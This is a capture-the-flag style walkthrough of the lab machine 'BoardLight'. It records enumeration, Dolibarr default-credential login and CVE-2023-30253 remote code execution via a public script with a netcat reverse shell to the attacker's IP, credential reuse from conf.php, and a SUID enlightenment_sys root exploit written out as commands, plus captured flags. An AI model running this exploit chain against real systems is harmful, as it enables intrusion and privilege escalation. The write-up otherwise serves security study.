BoardLight: Vulnerabilities: Dolibarr Remote Code Execution, default credentials 


Enumeration: 
nmap -sV -sC -p- --min-rate=1000 10.129.88.30

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

gobuster vhost -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://board.htb --append-domain

http://crm.board.htb/  was discovered

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-30253 

Dolibarr before 17.0.1 allows remote code execution by an authenticated user via an uppercase manipulation: <?PHP instead of <?php in injected data.


Default dolibarr login
admin
admin

https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253 

On attack: nc -lnvp 4444

python3 exploit.py http://crm.board.htb admin admin 10.10.14.206 4444 

Now we have remote code execution on victim


https://github.com/peass-ng/PEASS-ng/releases/tag/20240630-b2cfbe8a 

cat /etc/passwd | grep /bin/bash  

<cs/public/website$ cat /etc/passwd | grep /bin/bash            
root:x:0:0:root:/root:/bin/bash
larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash

We found a conf file that has user and password

ww-data@boardlight:~/html/crm.board.htb/htdocs/conf$ cat conf.php
cat conf.php
<?php
//
// File generated by Dolibarr installer 17.0.0 on May 13, 2024
//
// Take a look at conf.php.example file for an example of conf.php file
// and explanations for all possibles parameters.
//
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';

There was nothing here but we tried to use the password on another user called Larissa
mysql 10.129.88.30 -P 3306 -u dolibarrowner -p serverfun2$2023!!


Larissa had the password serverfun2$2023!! through her SSH

larissa@boardlight:~$ cat user.txt
Eda85424192f1ae1367345975eea775a

Go back in through the web server’s RCE exploit and do
su larissa
python3 -c 'import pty; pty.spawn("/bin/bash")'



Let’s find binaries with SetUID to get root
find / -perm -4000 -type f 2>/dev/null

We found enlightenment which can be exploited with the commands below
https://www.exploit-db.com/exploits/51180 


mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"

echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
echo "[+] Welcome to the rabbit hole :)"

/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net

I got the root shell now

cat root.txt
331de634dc56cb15438b76f964a4e6a3


Enlightenment exploit:
-Misconfiguration in enlightenment_sys binary with setUID bit set permission 4000, and here we run the binary with path /bin/mount and specific options to trigger the exploit to exploit a vulnerability in handling ../ paths
            

Python script Exploit for dolibarr remote code execution explanation: 
-Logins with Dolibarr admin credentials, and creates a new website and page in dolibarr using its functionality, then injects malicious code into the that page to give attack control of the server
